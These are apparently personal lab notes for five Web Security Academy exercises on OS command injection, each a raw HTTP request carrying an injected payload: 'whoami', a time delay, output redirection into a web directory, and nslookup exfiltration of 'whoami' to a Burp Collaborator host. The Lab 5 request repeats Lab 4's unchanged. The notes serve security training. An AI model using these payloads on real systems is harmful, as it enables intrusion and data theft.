## Lab - 1: OS command injection, simple case

```
POST /product/stock HTTP/1.1
...
Referer: https://0af300780436dfe1c01a0fcf00e500a9.web-security-academy.net/product?productId=1
...

productId=1&storeId=1|whoami
```

## Lab - 2: Blind OS command injection with time delays

```
POST /feedback/submit HTTP/1.1
...
Referer: https://0a80001303ab17adc04691580066009d.web-security-academy.net/feedback
...

csrf=CHt9Kb30ZQkTSwACtbyri7QdKYWVHre4&name=test&email=test%40gmail.com||+sleep+10s+#&subject=Test+subject&message=Test+message
```

## Lab - 3: Blind OS command injection with output redirection

- submit feedback is vulnerable to OS injection
- test where it is vulnerable by above methods
- `/var/www/images` path is writable and save the result in that path

```
POST /feedback/submit HTTP/1.1
...
Referer: https://0ab8009204e76c79c015560d00420073.web-security-academy.net/feedback
...

csrf=XQsZF7rH1iJqdZr1MW0s7AtL7N2KGJMF&name=Test&email=test%40gmail.com%26+whoami+>+/var/www/images/whoami.png+%23&subject=Test+subject&message=Test+message
```

## Lab - 4: Blind OS command injection with out-of-band interaction

- The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

```
POST /feedback/submit HTTP/1.1
...
Referer: https://0ac300de04a31a9ec0538c0b00a10098.web-security-academy.net/feedback
...

csrf=IzRY4UoLitvaWBIbL3LsJMqfmRVFsXwj&name=Test&email=test%40gmail.com%26+nslookup+`whoami`.lj8qr2ywkx0a1ck7x286sxon5eb4zt.burpcollaborator.net+%23&subject=Test+subject&message=Test+Message
```

## Lab - 5: Blind OS command injection with out-of-band data exfiltration

```
POST /feedback/submit HTTP/1.1
...
Referer: https://0ac300de04a31a9ec0538c0b00a10098.web-security-academy.net/feedback
...

csrf=IzRY4UoLitvaWBIbL3LsJMqfmRVFsXwj&name=Test&email=test%40gmail.com%26+nslookup+`whoami`.lj8qr2ywkx0a1ck7x286sxon5eb4zt.burpcollaborator.net+%23&subject=Test+subject&message=Test+Message
```

From Burp Collaborator Client, click `Poll now` and from DNS results,`The Collaborator server received a DNS lookup of type A for the domain name peter-axW0eL.uxvk7rww9jerxjwicuxiozhuvl1bp0.burpcollaborator.net.`
